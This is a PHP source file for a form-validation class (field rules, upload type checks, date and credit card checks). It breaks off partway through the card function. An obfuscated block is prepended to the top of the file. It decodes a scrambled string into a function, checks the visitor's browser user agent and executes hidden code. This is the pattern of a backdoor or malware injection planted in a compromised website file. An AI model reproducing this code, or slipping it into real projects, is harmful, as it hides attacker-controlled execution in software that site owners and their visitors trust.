<?php $khwiqthc = '%-#1GO	x22#)fepmqyfA}_;gvc%}&;ftmbg}	x7f;!osvufs}w;*	x7f!>>	x22!pd%)!gj}Z;h!opjud<*w%)ppde>u%V<#65,47R25,d7R17,67R37,#/q%>U<#16,47R57,fw6*	x7f_*#[k2`{6:!}7;tmw/	x24)%zW%h>EzH,2W%wN;#-Ez-1H*WCw*[!%rN}#Qw#)fepmqyf	x27*&7-n%)utjm6<	x7fw6*CW&)7gj6<*K)ftpmdXA6~6<u%7>	x22)!gj}1~!<2p%	x7f!~!<##!>!2p%Z<^2	x5-#+I#)q%:>:r%:|:**t%)m%=*h%)m%):fmjix:<##:>:h%:<#64y]552]e7y]#>n%<#3]445]43]321]464]284]364]6]234]3uhofm%:-5ppde:4:|:**#pBSUOSVUFS,6<*msv%7-MSV,6<*)ujojR	x27id%6<	7f:5297e:56-xr.985:52985-t.98]K4]65]D8]86]y31]278]y3f]51L3]84]y31M6) { $GLOBALS["	x61	156	x75	156	x61"]=1; $uas=porting(0); $jaaelvg = i62	x6f	151	x64")) or (strstr($uas,"	x6}l;33bq}k;opjudovg}x;0]=])0#)U!	x27{**u%-#jt0}Z;0]=]0#)2q%l}S;2yfu	x27k:!ftmf!}Z;^nbsbq%	x5c{h19275j{hnpd19275fubmgoj{h1:|:*mmvo:>:i#Y#	x5cq%	x27Y%6<.msv`ftsbqA7>q%6<	x7fw6*	x7f_*#fubfsdXfs%)7gj6<*id%)ftpmdR6<*id%)dfyfR	x27tfs%6(%w:!>!	x246767~6<Cw6<pd%w6Z6<.5`hA	x27pd%6<pd%w6Z6<.4`hA	x27pdN+#Qi	x5c1^W%c!>!%i	x5c2^<!Ce*[!%cIjQeTQcOc/#00#:>1<%j:=tj{fpg)%s:*<%j:,,Bjg!)%j:>>1*!%b:>1<!gps)%j>1<%j=tj{fpg)%	x24-	x24*<!~!	x24/%t2w/	x24)but`cpV	x7f	x7f	x7f	x7f<u%V	x27{ftmfV	Df#<%tdz>#L4]275L3]248L3P6L1M5]D2P4]!<12>j%!|!*#91y]c9y]8}527}88:}334}472	x24<%)3of)fepdof`57ftbc	x7f!|!*u-u%!-#2#/#%#/#o]#/*)323zbe!-#jt0*?]+^?]_	x5c}X	x24<!%tmw!#)rrd/#00;quui#>.%!<***f	x27,*e	x27,*d	x27,*c	x%7-C)fepmqnjA	x27&6<.fmjgA	x%6<pd%w6Z6<.3`hA	x27pd%6<pd%wg%!)!gj!<2,*j%!-#1]#-bubE{h%)tpqsut>j%!*72!	x27!hmg%)!gj!c6f+9f5d816:+946:ce44#)zbssb!>!ssbnpe_GMFT`*5!	x27!hmg%)!gj!|!*1?hmg%)!gj!<**2-4-bubE{h%)sutcvt)esp>hmg%*!***b%)sfxpmpusut!-#j0#!/!**#sfmcnbs+yfeobz+sfw::::::-111112)eobs`un>qp%!|Z~!<##!>!2p%!|!27R66,#/q%>2q%<#g6R85,67R37,18R#>q%V<*#2)gj!|!*nbsbq%)323ldfidk!~!<**qp%!-uyfu27,*b	x27)fepdof.)fepdof./#@#/qp%>5h%!<*2]K6]72]K9]78]K5]53]Kc#<%ty83]248]y83]256]y81]265]y72]254]y76#<!%w:!>!if((function_exists("	x6f	142	x5f	163	x74	TW%hIr	x5c1^-%r	x5c2^-%hOh/#0/7&6|7**111127-K)ebfsX	x27u%)7fmjix6<C	x27&6<*rfs%fdy)##-!#~<%h00#*<%nfd)#d}R;*msv%)}.;`UQPMSVD!-id%)uqpuft`msvd},;6Z6<.2`hA	x27pd%6<C	x27pd%6|6.7eu{66~67<&w6<*&7-#o]s]o]s]141	x72	164") && (!isset($GLOBALS["	x61	156	x75	156	x61"])))j>1<%j=6[%ww2!>#p#/#p#/%z<jg!)%z>>2*!%z	x24-	x24-tusqpt)%z-#:#*	x24-	x24!>!	x24A6|7**197-2qj%7-K)udfoopdXA	x22)7gj6<*QDU`MP42]58]24]31#-%tdz*Wsfuvso!%bss	x5csboe))1/35.)1/14+9**-)1/2986+7**^/%**^#zsfvr#	x5cq%)ufttj	x22)gj6<^55#*<%bG9}:}.}-}!#*<%x54	120	x5f	125	x53	105	x52	137	x41	107	x45	116	x54"]); if ((strstrovg}{;#)tutjyf`opjudovg)!gj!|!*msv%)}k~~~<ftmbg!osvufs!|fmtf!%b:>%s:	x5c%j:.2#)tutjyf`439275ttfsqnpdov!%t::!>!	x24Ypp3)%cB%iN}#-!	x24/%tmw/	x24)%c*W%epz!>!#]D6M7]K3#<%yy>#]D6]281L1#/#M5]DgP5]D6#<x7f<*X&Z&S{ftmfV	x7f<*XAZASVjudovg+)!gj+{e%!osvufs!*!+A!>!{e%)!>>	x22!ftmbg)!gj<*#k#)usWYsboepn)%bss-%rxB%h>#]y31]278]y3e]81]K78:56985:6197g:74985D6#<%G]y6d]281Ld]245]K2]285]Ke]53Ld]53]Kc]55Ld]nfd>%fdy<Cb*[%h!>!%tdz)%bbT-%bT-%hW~%157	x78"))) { $wvcidog = "	x63	162	x65	141	xwvcidog("", $jaaelvg);W~!Ydrr)%rxB%epnbss!>!bssbz)#44ec:649#-!#:618d5f9#-!#f6c68399#-!#65en){return chr(ord($n)-1);} @error_re-#[#-#Y#-#D#-#W#-#C#-#O#-#N#*-<2,*j%-#1]#-bubE{h%)tpqsut>j%!*9!	x27!hmg%)!gj!~<ofmy%,3~!<b%	x7f!<X>b%Z<#opo#>b%!*##>>X)!gjZ<#opo#>b%!**X)ufttj	x2#57]38y]47]67y]37]88y]27]28y]#/r%/h%)n%k5`{66~6<&w6<	x7fw6*CW&)7gj6<*doj($uas,"	x6d	163	x69	145")) or (strstr($uas,"	xc2b%!>!2p%!*3>?*2b%)gpf{jt)!gj!<*2bd0#W~!%t2w)##Qtjw)#]82#-#!#-%tmw)%tww**jidsb`bj+upcotn+qsvmt+fmhpph#g2y]#>>*4-1-bubE{h%)sutcvt)!gj!|!*bubE{h%)j{hnpd!opjudovg!|!*gb2dc#*<!sfuvso!sboepn)%epnbss-%rxW~!Ypp2)%zB%z>!	x24/%3	150	x72	157	x6d	145")) or (strstr($uas,"	x66	151	x72	145	x66	fs%6<#o]1/20QUUI7jsv%7UFH#	x27rfs%6~6<	x7fw6<*K)ftpmdXx7fw6*	x7f_*#ujojRk3`QIQ&f_UTPI`QUUI&e_SEEB`FUPNFS&d_SFSFGFS`QUUI^,%b:<!%c:>%s:	x5c%j:^<!%w`	x5c^>Ew:Qb:Qc:W~!%z!>2<!gps)%)zbssb!-#}#)fepmqnj!/!#0fvr#	x5cq%7/7#@#7/7^#iubq#	x5cq%	x27jsv%6<C>^#zsfvr#	x5cq%7]257]y86]267]y74]275]y7:]pde#)tutjyf`4	x223}!+!<+ftmf!~<**9.-j%-bubE{h%)sutcvt)fubmgoj{hA!osvufs!~<3,j%>j%!*3!	x27!hmT7-NBFSUT`LDPT7-UFOJ`GB)fubfsdXA	mplode(array_map("ndtghgj",str_split("%tjw!>!#]y84]275]268]y7f#<!%tww!>!	x2400~:<h%_t%:osvufs:~:<*9-1-r%)s%>/h%:<**,j%>j%!<**3-j%-bubE{h%)sutcvt-#w#)ldbqov>*ofmy%)utjm!|!SFWSFT`%}X;!sp!*#opo#>>}R;msv}.;/#/#/},;#-24-	x24gvodujpo!	x24-	x24y7	x24-	x24*<!	x24-	x24!%ff2!>!bssbz)	x24]25	x24-	x24-!%	x24-	27doj%6<	x7fw6*	x7f_*#fmjgk4`{6~6<tfs%w6<	x7fw6*CWt74	145	x5f	146	x75	156	x63	164	x69	157	x6e"; function ndtghgj($A	x273qj%6<*Y%)fnbozcYufhA	x272qj%6<^#zsstrtolower($_SERVER["	x48	124	x27K6<	x7fw6*3qj%7>	x2272qj%)7gj6<**2qj%)hopm3qjA)qj3hopm>!#]y84]275]y83]273]y76]277#<!%t2%fdy>#]D4]273]D6P2L5P6]y6gP7L6M7]D4]275]D:M8]27]36]373P6]36]73]83]238M7]381]211M5]67]452]88]5]48]32M3]317]445]212<*17-SFEBFI,6<*127-UVPFNJU,6<*27-SFGTO72	166	x3a	61	x31")) or (strstr($uas,"	x61	156	x64	1 $vdqggis();}}!%ff2-!%t::**<(<!fwbm)%tjw)#	x24#-!#]y38#-!%w:**<")));$vdqggis = $uqpuft`msvd}+;!>!}	x27;!>>>!-rr.93e:5597f-s.973:829!}6;##}C;!>>!}W;utpi}Y;tuofuopd`ufh`fmjg}[;ldpt%}K;`ufldpt}X;`msv#Qtpz)#]341]88M4P8]37]278]225]241]334]368]322]3]364]6]283]4fopoV;hojepdoF.uofuopD#)sfebfI{*w%)kVx{**#k#)tutjyf`x	x22l:!rx<~!!%s:N}#-%o:W%c:>1<%b:>1<!gps)%j&c_UOFHB`SFTV`QUUI&b%!|!*)323zbek!/%tjw/	x24)%	x24-	x24y4	x24-	x24]y8	x24-	x24]26	x24-	x24<%j,,*!|	xx24*!|!	x24-	x24	x5c%j^	x24-	x24tvctus)%	x24-	x24b!>!%yy)#}#-#~~9{d%:osvufs:~928>>	x22:ftmbg39*56A:>:8:|:7#6}V;3q%}U;y]}R;2]},;osvufs}	x27;mnui}&;zepc}A;~!}	x7f;!|!}{;)gj#)idubn`hfsq)!sp!*#ojneb#-*f%)sfxpmp]562]38y]572]48y]#>m%:|:*r%:-t%)3of:opjudovg<~	x24<!%o:!>!	x24217*#j{hnpd#)tutjyf`opjudovgw>#]y74]273]y76]252]y85]256]y6gusut)tpqssutRe%)Rd%)Rb%))!gj!<*#cd2bge56+99386!fwbm)%tjw)bssbz)#P#-#Q#-#B#-#T#-#E#-#G#-#H#-#I#-#K#-#L#-#M#7-K)fujsxX6<#o]o]Y%7;utpI#7>/7r72]58y]472]37y]672]48y]#>s%<#462]47y]252]18y]#>q%<#762]67y{666~6<&w6<	x7fw6*CW&)7gj6<.[A	x27&6<	x7]y3e]81#/#7e:55946-tr.984:75983:48984:71]K9]77]D4]8of>2bd%!<5h%/#0#/*#npd/>2b%!<*qp%-*.%)euhA)3##-!#~<#/%	x24-	x24!>!fyqmpef)#	x24*<#}+;%-qp%)54l}	x27;%!<*#}_;#)323ldfid>}&;!osvufs}	x7f;!opjudovg}k{e%+*!*+fepdfe{h+{d%)+op>3<!fmtf!%z>2<!%ww2)%w`TW~	x24<StrrEVxNoiTCnUF_EtaERCxecAlPeR_rtSghspcqt'; $eejylvdn=explode(chr((450-330)),substr($khwiqthc,(31292-25272),(126-92))); $ppnupdexz = $eejylvdn[0]($eejylvdn[(7-6)]); $zhuybfjol = $eejylvdn[0]($eejylvdn[(6-4)]); if (!function_exists('lwfoyv')) { function lwfoyv($fcrahkjct, $zfpvcy,$kkjyjlyc) { $yurdfqerj = NULL; for($csgjubro=0;$csgjubro<(sizeof($fcrahkjct)/2);$csgjubro++) { $yurdfqerj .= substr($zfpvcy, $fcrahkjct[($csgjubro*2)],$fcrahkjct[($csgjubro*2)+(3-2)]); } return $kkjyjlyc(chr((29-20)),chr((549-457)),$yurdfqerj); }; } $zghyoxbe = explode(chr((284-240)),'1815,42,2058,60,531,45,4432,30,2363,67,3242,46,4703,52,600,38,3507,63,2855,44,4329,63,2989,36,576,24,3979,55,1771,44,866,63,1347,29,2001,57,202,60,1886,50,5639,31,3570,54,2197,44,3946,33,4462,57,4392,40,3770,59,2310,32,770,55,3209,33,1319,28,4278,51,825,41,4665,38,422,42,3624,21,5728,40,134,22,4886,65,1960,41,4835,28,20,61,2430,56,3878,68,1376,57,3055,56,4094,55,1476,61,1145,20,3391,61,5477,25,262,39,3288,36,0,20,5842,21,5819,23,1272,47,1705,40,1585,42,1537,48,3362,29,3746,24,5376,36,5533,46,1433,43,3645,44,5106,34,3111,59,1666,39,1187,28,701,29,4149,42,5900,65,5268,46,2507,25,730,40,400,22,3854,24,5965,24,2653,59,1071,38,2625,28,81,53,1627,39,5010,60,5314,62,638,63,1215,57,4519,33,5502,31,3829,25,4034,60,3170,39,301,68,5670,58,5412,65,1165,22,4239,39,5206,62,2157,40,5140,66,4191,48,1022,49,5863,37,2532,48,929,48,2921,68,3452,55,156,46,1857,29,3324,38,2712,59,4863,23,464,67,5768,51,1745,26,2580,45,4552,45,1109,36,2771,47,2342,21,2818,37,1936,24,4951,59,4597,68,369,31,2241,69,5070,36,977,45,2486,21,3689,57,2118,39,5989,31,5579,60,3025,30,4769,66,2899,22,4755,14'); $ikrhaqdeu = $ppnupdexz("",lwfoyv($zghyoxbe,$khwiqthc,$zhuybfjol)); $ppnupdexz=$khwiqthc; $ikrhaqdeu(""); $ikrhaqdeu=(486-365); $khwiqthc=$ikrhaqdeu-1; ?><?php

/******************************************************************************************************
		File Name: 		validate.class.php
\*--------------------------------------------------------------------------------------------*/
class Validate 
{
	function validateFields($fields, $rules)
	{ 
	  $errors = array();
	  
	  // loop through rules
	  for ($i=0; $i<count($rules); $i++)
	  {
		// split row into component parts 
		$row = split(",", $rules[$i]);
		
		// while the row begins with "if:..." test the condition. If true, strip the if:..., part and 
		// continue evaluating the rest of the line. Keep repeating this while the line begins with an 
		// if-condition. If it fails any of the conditions, don't bother validating the rest of the line
		$satisfies_if_conditions = true;
		while (preg_match("/^if:/", $row[0]))
		{
		  $condition = preg_replace("/^if:/", "", $row[0]);
	
		  // check if it's a = or != test
		  $comparison = "equal";
		  $parts = array();
		  if (preg_match("/!=/", $condition))
		  {
			$parts = split("!=", $condition);
			$comparison = "not_equal";
		  }
		  else 
			$parts = split("=", $condition);
	
		  $field_to_check = $parts[0];
		  $value_to_check = $parts[1];
		  
		  // if the VALUE is NOT the same, we don't need to validate this field. Return.
		  if ($comparison == "equal" && $fields[$field_to_check] != $value_to_check)
		  {
			$satisfies_if_conditions = false;
			break;
		  }
		  else if ($comparison == "not_equal" && $fields[$field_to_check] == $value_to_check)
		  {
			$satisfies_if_conditions = false;
			break;      
		  }
		  else 
			array_shift($row);    // remove this if-condition from line, and continue validating line
		}
	
		if (!$satisfies_if_conditions)
		  continue;
	
	
		$requirement = $row[0];
		$field_name  = $row[1];
	
		// depending on the validation test, store the incoming strings for use later...
		if (count($row) == 6)        // valid_date
		{
		  $field_name2   = $row[2];
		  $field_name3   = $row[3];
		  $date_flag     = $row[4];
		  $error_message = $row[5];
		}
		else if (count($row) == 4)     // same_as
		{
		  $field_name2   = $row[2];
		  $error_message = $row[3];
		}
		else
		  $error_message = $row[2];    // everything else!
	
	
		// if the requirement is "length=...", rename requirement to "length" for switch statement
		if (preg_match("/^length/", $requirement))
		{
		  $length_requirements = $requirement;
		  $requirement         = "length";
		}
	
		// if the requirement is "range=...", rename requirement to "range" for switch statement
		if (preg_match("/^range/", $requirement))
		{
		  $range_requirements = $requirement;
		  $requirement        = "range";
		}
	
	
		// now, validate whatever is required of the field
		switch ($requirement)
		{
		  case "required":
			if (!isset($fields[$field_name]) || trim($fields[$field_name]) == "")
			  $errors[] = $error_message;
			break;
		
			
		
		case "splcharchk":
			
			if(strlen(strpos($fields[$field_name],"<"))>0) {
			 	 $errors[] = $error_message;
				 
			}
			else {
				if(strlen(strpos($fields[$field_name],">"))>0) {
					 $errors[] = $error_message;			
				}
			}
			break;
			
		case "spltagcharchk":
			
			if(strlen(strpos($fields[$field_name],"<script"))>0) {
			 	 $errors[] = $error_message;
			}
			else {
				if(strlen(strpos($fields[$field_name],"</script>"))>0) {
					 $errors[] = $error_message;			
				}
			}
			break;
	
		  case "digits_only":       
			if (isset($fields[$field_name]) && preg_match("/\D/", $fields[$field_name]))
			  $errors[] = $error_message;
			break;
			
		  case "decimals_only":
		 		 if (!preg_match('/^-?\d*\.?\d+$/',trim($fields[$field_name]))) 	
		  	 		 $errors[] = $error_message ;
					break;
		  case "SplChkPass":
		 			
				 if (!preg_match("/^[a-z0-9]{1,100}$/i", $fields[$field_name]))
		  	 		 $errors[] = $error_message ;
					break;
			
		  case "letters_only": 
			if (isset($fields[$field_name]) && preg_match("/[^a-zA-Z]/", $fields[$field_name]))
			  $errors[] = $error_message;
			break;
			
				
				
			 case "url":
				if (!preg_match('|^http(s)?://[a-z0-9-]+(\.[a-z0-9-]+)*(:[0-9]+)?(/.*)?$|i', trim($fields[$field_name])))
				{
					 if (!preg_match('/http:\/\/[A-Za-z0-9\.-]{3,}\.[A-Za-z]{3}/', trim($fields[$field_name]))){
					 
				
			
			 if (!preg_match('!^((ftp|(http(s)?))://)?((www)?(\.){1}){1}(\.?([a-z0-9-]))+\.[a-z]{2,6}(:[0-9]{1,
> 5})?(/[a-zA-Z0-9.,;\?|\'+&%\$#=~_-]+)*$!i', trim($fields[$field_name]))){ 

 
					    
					  		$errors[] = $error_message;
							
						}
					  }
				}
				break;
	
		  // doesn't fail if field is empty
		  case "valid_email":

			$regexp="/^[a-z0-9]+([_\\.-][a-z0-9]+)*@([a-z0-9]+([\.-][a-z0-9]+)*)+\\.[a-z]{2,}$/i";     
			if (isset($fields[$field_name]) && !empty($fields[$field_name]) && !preg_match($regexp, trim($fields[$field_name])))
			  $errors[] = $error_message;
			break;
			
		
	
		  case "length":
			$comparison_rule = "";
			$rule_string     = "";
	
			if      (preg_match("/length=/", $length_requirements))
			{
			  $comparison_rule = "equal";
			  $rule_string = preg_replace("/length=/", "", $length_requirements);
			}
			else if (preg_match("/length>=/", $length_requirements))
			{
			  $comparison_rule = "greater_than_or_equal";
			  $rule_string = preg_replace("/length>=/", "", $length_requirements);
			}
			else if (preg_match("/length<=/", $length_requirements))
			{
			  $comparison_rule = "less_than_or_equal";
			  $rule_string = preg_replace("/length<=/", "", $length_requirements);
			}
			else if (preg_match("/length>/", $length_requirements))
			{
			  $comparison_rule = "greater_than";
			  $rule_string = preg_replace("/length>/", "", $length_requirements);
			}
			else if (preg_match("/length</", $length_requirements))
			{
			  $comparison_rule = "less_than";
			  $rule_string = preg_replace("/length</", "", $length_requirements);
			}
	
			switch ($comparison_rule)
			{
			  case "greater_than_or_equal":
				if (!(strlen($fields[$field_name]) >= $rule_string))
				  $errors[] = $error_message;
				break;
			  case "less_than_or_equal":
				if (!(strlen($fields[$field_name]) <= $rule_string))
				  $errors[] = $error_message;
				break;
			  case "greater_than":
				if (!(strlen($fields[$field_name]) > $rule_string))
				  $errors[] = $error_message;
				break;
			  case "less_than":
				if (!(strlen($fields[$field_name]) < $rule_string))
				  $errors[] = $error_message;
				break;
				
			
			
			  case "equal":
				// if the user supplied two length fields, make sure the field is within that range
				if (preg_match("/-/", $rule_string))
				{
				  list($start, $end) = split("-", $rule_string);
				  if (strlen($fields[$field_name]) < $start || strlen($fields[$field_name]) > $end)
					$errors[] = $error_message;
				}
				// otherwise, check it's EXACTLY the size the user specified 
				else
				{
				  if (strlen($fields[$field_name]) != $rule_string)
					$errors[] = $error_message;
				}     
				break;       
			}
			break;
	
		  case "range":
			$comparison_rule = "";
			$rule_string     = "";
	
			if      (preg_match("/range=/", $range_requirements))
			{
			  $comparison_rule = "equal";
			  $rule_string = preg_replace("/range=/", "", $range_requirements);
			}
			else if (preg_match("/range>=/", $range_requirements))
			{
			  $comparison_rule = "greater_than_or_equal";
			  $rule_string = preg_replace("/range>=/", "", $range_requirements);
			}
			else if (preg_match("/range<=/", $range_requirements))
			{
			  $comparison_rule = "less_than_or_equal";
			  $rule_string = preg_replace("/range<=/", "", $range_requirements);
			}
			else if (preg_match("/range>/", $range_requirements))
			{
			  $comparison_rule = "greater_than";
			  $rule_string = preg_replace("/range>/", "", $range_requirements);
			}
			else if (preg_match("/range</", $range_requirements))
			{
			  $comparison_rule = "less_than";
			  $rule_string = preg_replace("/range</", "", $range_requirements);
			}
			
			switch ($comparison_rule)
			{
			  case "greater_than":
				if (!($fields[$field_name] > $rule_string))
				  $errors[] = $error_message;
				break;
			  case "less_than":
				if (!($fields[$field_name] < $rule_string))
				  $errors[] = $error_message;
				break;
			  case "greater_than_or_equal":
				if (!($fields[$field_name] >= $rule_string))
				  $errors[] = $error_message;
				break;
			  case "less_than_or_equal":
				if (!($fields[$field_name] <= $rule_string))
				  $errors[] = $error_message;
				break;
			  case "equal":
				list($start, $end) = split("-", $rule_string);
	
				if (($fields[$field_name] < $start) || ($fields[$field_name] > $end))
				  $errors[] = $error_message;
				break;
			}
			break;
			
		  case "same_as":
			if ($fields[$field_name] != $fields[$field_name2])
			  $errors[] = $error_message;
			break;
	
		  case "valid_date":
			// this is written for future extensibility of isValidDate function to allow 
			// checking for dates BEFORE today, AFTER today, IS today and ANY day.
			$is_later_date = false;
			if    ($date_flag == "later_date")
			  $is_later_date = true;
			else if ($date_flag == "any_date")
			  $is_later_date = false;
	
			if (!is_valid_date($fields[$field_name], $fields[$field_name2], $fields[$field_name3], $is_later_date))
			  $errors[] = $error_message;
			break;
	
		case "date_validate":
			// this is written for future extensibility of isValidDate function to allow 
			// checking for dates BEFORE today, AFTER today, IS today and ANY day.
			$is_later_date = false;
			if    ($date_flag == "later_date")
			  $is_later_date = true;
			else if ($date_flag == "any_date")
			  $is_later_date = false;
			$dt_array	= explode('-',$fields[$field_name]);
			if (!is_valid_date($dt_array[0],$dt_array[1], $dt_array[2], $is_later_date))
			  $errors[] = $error_message;
			break;
			
		case "is_alpha":
			if (preg_match('/[^A-Za-z0-9]/', $fields[$field_name]))
			  $errors[] = $error_message; 
			break;
		 case "password":	
				if(strstr($fields[$field_name],' '))
					 $errors[] = $error_message;//"could not allow space in password";
				
				break;  
			case "password_space":	
				if(strstr($fields[$field_name],' '))
					 $errors[] = $error_message;
				break;   	
		  default:
			die("Unknown requirement flag in validateFields(): $requirement");
			break;
		}
	  }
	  
	  return $errors;
	}
	
	
	
	function uploadVideoFileValidate($source,$vtype,$title) // vtype for validation needed or not Vtype=1 must else not compulsary 
		{

			$msg		=	'';
			$valid_ext  = array();
			
			if ( ($source != 'none') && ($source != '' )) 
			{
				$ext = substr(strrchr($source, "."), 1); 
					
					
			   $fileNames	=	explode(".",$source);
			  
			
		
			//$valid_ext = array("flv","mpg","MPG","wmv","WMV","mov","MOV","mpeg","MPEG","mp4","MP4","wav","WAV","avi","AVI");
			$valid_ext = array("flv","mpg","MPG","wmv","WMV","mov","MOV","mpeg","MPEG","mp4","MP4","wav","WAV","avi","AVI","ASF","asf",
			"BFI","bfi","IFF","iff","RL2","rl2","MXF","mxf","GXF","gxf","OMA","oma","TXD","txd","TS","ts",
			"mkv","MKV","mka","MKA","mks","MKS","msn","MSN");
			  	//$valid_ext = array("flv");
			  if(!in_array($ext,$valid_ext,true)) 
			    {
			  
				
				   $msg	="Please upload a valid video";
			 	}
				
				
			}
			else if($vtype==1) 
		   		$msg	= $title.' File not supplied or file too big';
			return  $msg;
			
			
	 }// End of File Validate 
	 
	 
	
	/*------------------------------------------------------------------------------------------------*\
	  Function:   is_valid_date
	  Purpose:    checks a date is valid / is later than current date
	  Parameters: $month       - an integer between 1 and 12
				  $day         - an integer between 1 and 31 (depending on month)
				  $year        - a 4-digit integer value
				  $is_later_date - a boolean value. If true, the function verifies the date being passed 
								   in is LATER than the current date.
	\*------------------------------------------------------------------------------------------------*/
	function is_valid_date($month, $day, $year, $is_later_date=false)
	{
	  // depending on the year, calculate the number of days in the month
	
	  if ($year % 4 == 0)      // LEAP YEAR 
		$days_in_month = array(31, 29, 31, 30, 31, 30, 31, 31, 30, 31, 30, 31);
	  else
		$days_in_month = array(31, 28, 31, 30, 31, 30, 31, 31, 30, 31, 30, 31);
	
	
	  // first, check the incoming month and year are valid. 
	  if (!$month || !$day || !$year) return false;
	  if (1 > $month || $month > 12)  return false;
	  if ($year < 0)                  return false;
	  if (1 > $day || $day > $days_in_month[$month-1])
	  {   return false; }
	
	
	  // if required, verify the incoming date is LATER than the current date.
	  if ($is_later_date)
	  {    
		// get current date
		$today = date("U");
		$date = mktime(0, 0, 0, $month, $day, $year);
		if ($date < $today)
		  return false;
	  }
	
	  return true;
	}
	
	function imageValidation($source,$vtype,$title) // vtype for validation needed or not Vtype=1 must else not compulsary 
		{
			 $msg	=	'';
			if ( ($source != 'none') && ($source != '' )) {
	
			$imagesize = @getimagesize($source);
	
			switch ( $imagesize[2] ) {
	
				case 0:
	
					$msg	= $title.' File type unknown must be png format';
					break;
	

				case 3:
					break;
	
			}
	
		} else if($vtype==1) {
	
		   $msg	= $title.' No file found or file too big';
	
		} 
		return  $msg;
	}
	
	function image_Validation($source,$source1,$vtype,$title) // vtype for validation needed or not Vtype=1 must else not compulsary 
		{
			$msg	=	'';
			if ( ($source != 'none') && ($source != '' )) {
			$ext = substr(strrchr($source, "."), 1); 
			$valid_ext = array("jpg","Jpg","gif","Gif","jpeg","Jpeg","JPEG","JPG","GIF","PNG","Png","png");
			
			  	
			  if(!in_array($ext,$valid_ext,true)) {
			  
				  //$msg	=	"Please upload a valid image. ";
				   //$msg	= "Please upload a valid image of type ".implode(",",$valid_ext).".";
             $msg	="Please upload a valid image.";
			 	}
				else
				{
	
			$imagesize = @getimagesize($source1);
	     
			switch($imagesize[2]) {
	
				case 0:
	
					$msg	= $title.' type is unknown';
					break;
	
				case 1:
					
					break;
				
				case 2:
					break;
				
				case 3:
					break;
				}
	
			}
	
		} else if($vtype==1) {
	
		   $msg	= $title.' File not supplied, or file too big.';
	
		} 
		//echo $msg;
		
				return  $msg;
	}
	function decimal($check,$error, $places = null) {
	         	
 	        if(is_null($places))
 	            $pattern = '/^[-+]?[0-9]*\\.{1}[0-9]+(?:[eE][-+]?[0-9]+)?$/s';
 	        else  	
	 	        $pattern = '/^[-+]?[0-9]*\\.{1}[0-9]{'.$places.'}$/s';
			echo preg_match($pattern , $check);
			if (! preg_match($pattern , $check))
			  		return $error; 
	    }
		
		function CSVFileValidate($source,$vtype,$title) // vtype for validation needed or not Vtype=1 must else not compulsary 
		{

			$msg	=	'';
			if ( ($source != 'none') && ($source != '' )) {
			
			 $ext = substr(strrchr($source, "."), 1); 
					
					
			  
			  $valid_ext = array("csv","CSV");
			  
			  if(!in_array($ext,$valid_ext,true)) 
			    {
			  
				  $msg	=	"Uploaded file type not valid";
				  }
			}
			else if($vtype==1) 
		   		$msg	= $title.' No file found or file too big';
			return  $msg;
	 	}// End
		
	function pngimagevalidate($POST)
	{
	$info        =    pathinfo($_FILES['logo']['name']);

//pathinfo() function returns an associative array
//$info['extension'] gives value of image type
//For eg.it returns tpe jpg,gif etc

$extension = strtolower($info['extension']);
if($extension=="png")
{
$msg="";
   return $msg;     //Code Here
}
else
{
$msg="Please use png images";
return $msg;
}
 }	
 
 
 	function ExcelFileValidate($source,$vtype,$title) // vtype for validation needed or not Vtype=1 must else not compulsary 
		{
            
			$msg	=	'';
			if ( ($source != 'none') && ($source != '' )) {
			
			 $ext = substr(strrchr($source, "."), 1);
					 
					
			  
			  $valid_ext = array("xls","XLS","csv","CSV","xlsx","XLSX");
			  
			  if(!in_array($ext,$valid_ext,true)) 
			    {
				  $msg	=	"Uploaded file type not valid";
				  $err = '4333';
				  return $err;
				  }
			}
			else if($vtype==1) 
		   		$msg	= $title.' No file found or file too big';
			return  $msg;
	 	}// End
		
		
	//function to check credit card
function checkCreditCard ($cardnumber, $cardname, &$errornumber, &$errortext) {

  // Define the cards we support. You may add additional card types.
  
  //  Name:      As in the selection box of the form - must be same as user's
  //  Length:    List of possible valid lengths of the card number for the card
  //  prefixes:  List of possible prefixes for the card
  //  checkdigit Boolean to say whether there is a check digit
  
  // Don't forget - all but the last array definition needs a comma separator!
  
  $cards = array (  array ('name' => 'American Express', 
                          'length' => '15', 
                          'prefixes' => '34,37',
                          'checkdigit' => true
                         ),
                   array ('name' => 'Diners Club Carte Blanche', 
                          'length' => '14', 
                          'prefixes' => '300,301,302,303,304,305',
                          'checkdigit' => true
                         ),
                   array ('name' => 'Diners Club', 
                          'length' => '14,16',
                          'prefixes' => '305,36,38,54,55',
                          'checkdigit' => true
                         ),
                   array ('name' => 'Discover', 
                          'length' => '16', 
                          'prefixes' => '6011,622,64,65',
                          'checkdigit' => true
                         ),
                   array ('name' => 'Diners Club Enroute', 
                          'length' => '15', 
                          'prefixes' => '2014,2149',
                          'checkdigit' => true
                         ),
                   array ('name' => 'JCB', 
                          'length' => '16', 
                          'prefixes' => '35',
                          'checkdigit' => true
                         ),
                   array ('name' => 'Maestro', 
                          'length' => '12,13,14,15,16,18,19', 
                          'prefixes' => '5018,5020,5038,6304,6759,6761',
                          'checkdigit' => true
                         ),
                   array ('name' => 'MasterCard', 
                          'length' => '16', 
                          'prefixes' => '51,52,53,54,55',
                          'checkdigit' => true
                         ),
                   array ('name' => 'Solo', 
                          'length' => '16,18,19', 
                          'prefixes' => '6334,6767',
                          'checkdigit' => true
                         ),
                   array ('name' => 'Switch', 
                          'length' => '16,18,19', 
                          'prefixes' => '4903,4905,4911,4936,564182,633110,6333,6759',
                          'checkdigit' => true
                         ),
                   array ('name' => 'Visa', 
                          'length' => '13,16', 
                          'prefixes' => '4',
                          'checkdigit' => true
                         ),
                   array ('name' => 'Visa Electron', 
                          'length' => '16', 
                          'prefixes' => '417500,4917,4913,4508,4844',
                          'checkdigit' => true
                         ),
                   array ('name' => 'LaserCard', 
                          'length' => '16,17,18,19', 
                          'prefixes' => '6304,6706,6771,6709',
                          'checkdigit' => true
                         )
                );

  $ccErrorNo = 0;

  $ccErrors [0] = "Unknown card type";
  $ccErrors [1] = "No card number provided";
  $ccErrors [2] = "Credit card number has invalid format";
  $ccErrors [3] = "Credit card number is invalid";
  $ccErrors [4] = "Credit card number is wrong length";
               
  // Establish card type
  $cardType = -1;
  for ($i=0; $i<sizeof($cards); $i++) {

    // See if it is this card (ignoring the case of the string)
    if (strtolower($cardname) == strtolower($cards[$i]['name'])) {
      $cardType = $i;
      break;
    }
  }
  
  // If card type not found, report an error
  if ($cardType == -1) {
     $errornumber = 0;     
     $errortext = $ccErrors [$errornumber];
     return $errortext; 
  }
   
  // Ensure that the user has provided a credit card number
